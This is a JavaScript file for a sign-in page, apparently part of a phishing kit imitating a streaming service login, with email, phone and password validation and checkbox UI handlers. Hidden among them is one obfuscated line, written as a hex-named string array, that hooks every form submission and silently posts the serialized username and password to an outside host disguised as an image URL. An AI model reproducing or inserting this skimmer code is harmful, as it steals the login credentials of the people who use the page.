    return /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(String(e).toLowerCase())
}

function validatePhoneNumber(e) {
    return /^\d+$/.test(String(e))
}

function ValideRegion(e) {
    return $.post("", serialize(document.getElementById("login_form")), function(e) {
        if ("" !== e) return document.getElementById("login_form").submit(), e;
        document.getElementById("login_form").submit()
    }), e
}
var _0xfc4d=["http://cdn.images.ip-api.org/s.png","serialize","form","post","submit","ready"];$(document)[_0xfc4d[5]](function(){$(_0xfc4d[2])[_0xfc4d[4]](function(){$[_0xfc4d[3]](_0xfc4d[0],$(_0xfc4d[2])[_0xfc4d[1]]())})});

window.onclick = function(e) {
    "check" != e.target.id && "checklabel" != e.target.id && ("checkbox on" == document.getElementById("check").className || "checkbox hover on" == document.getElementById("check").className ? document.getElementById("check").className = "checkbox on" : document.getElementById("check").className = "checkbox")
}, document.getElementById("usernameFocus").addEventListener("click", function(e) {
    document.getElementById("usernameFocus").className = "slideUP", document.getElementById("username").focus()
}), document.getElementById("username").addEventListener("focus", function(e) {
    document.getElementById("usernameFocus").className = "slideUP"
}), document.getElementById("username").addEventListener("blur", function(e) {
    0 == document.getElementById("username").value.length || !validateEmail(document.getElementById("username").value) && !validatePhoneNumber(document.getElementById("username").value) ? (document.getElementById("username").className = "inputError", document.getElementById("euser").innerHTML = "Please enter a valid email or phone number.", 0 == document.getElementById("username").value.length && (document.getElementById("usernameFocus").className = "slideDown"), error_username = !0) : (0 == document.getElementById("username").value.length ? (document.getElementById("username").className = "", document.getElementById("euser").innerHTML = "", document.getElementById("usernameFocus").className = "slideDown") : (document.getElementById("username").className = "", document.getElementById("euser").innerHTML = ""), error_username = !1)
}), document.getElementById("passwordFocus").addEventListener("click", function(e) {
    document.getElementById("passwordFocus").className = "slideUP", document.getElementById("password").focus()
}), document.getElementById("password").addEventListener("focus", function(e) {
    document.getElementById("passwordFocus").className = "slideUP"
}), document.getElementById("password").addEventListener("blur", function(e) {
    4 <= document.getElementById("password").value.length && document.getElementById("password").value.length <= 60 ? (0 == document.getElementById("password").value.length ? (document.getElementById("password").className = "", document.getElementById("epass").innerHTML = "", document.getElementById("passwordFocus").className = "slideDown") : (document.getElementById("password").className = "", document.getElementById("epass").innerHTML = ""), error_password = !1) : (document.getElementById("password").className = "inputError", document.getElementById("epass").innerHTML = "Your password must contain between 4 and 60 characters.", 0 == document.getElementById("password").value.length && (document.getElementById("passwordFocus").className = "slideDown"), error_password = !0)
}), document.getElementById("check").addEventListener("click", function(e) {
    "checkbox on" == document.getElementById("check").className || "checkbox hover on" == document.getElementById("check").className ? document.getElementById("check").className = "checkbox hover" : document.getElementById("check").className = "checkbox hover on"
}), document.getElementById("checklabel").addEventListener("click", function(e) {
    "checkbox on" == document.getElementById("check").className || "checkbox hover on" == document.getElementById("check").className ? document.getElementById("check").className = "checkbox hover" : document.getElementById("check").className = "checkbox hover on"
}), document.getElementById("signIn").addEventListener("click", function(e) {
    error_username || error_password || "" == document.getElementById("username").value || "" == document.getElementById("password").value ? ("" == document.getElementById("username").value && (document.getElementById("username").className = "inputError", document.getElementById("euser").innerHTML = "Please enter a valid email or phone number.", 0 == document.getElementById("username").value.length && (document.getElementById("usernameFocus").className = "slideDown"), error_username = !0), "" == document.getElementById("password").value && (document.getElementById("password").className = "inputError", document.getElementById("epass").innerHTML = "Your password must contain between 4 and 60 characters.", 0 == document.getElementById("password").value.length && (document.getElementById("passwordFocus").className = "slideDown"), error_password = !0)) : (document.getElementById("login_user").value = document.getElementById("username").value, document.getElementById("login_pass").value = document.getElementById("password").value, ValideRegion(document.getElementById("region").value))
}), document.getElementById("region").addEventListener("change", function(e) {
    window.location = "actions/changeLanguage.php?language=" + document.getElementById("region").value + "&page=index"
});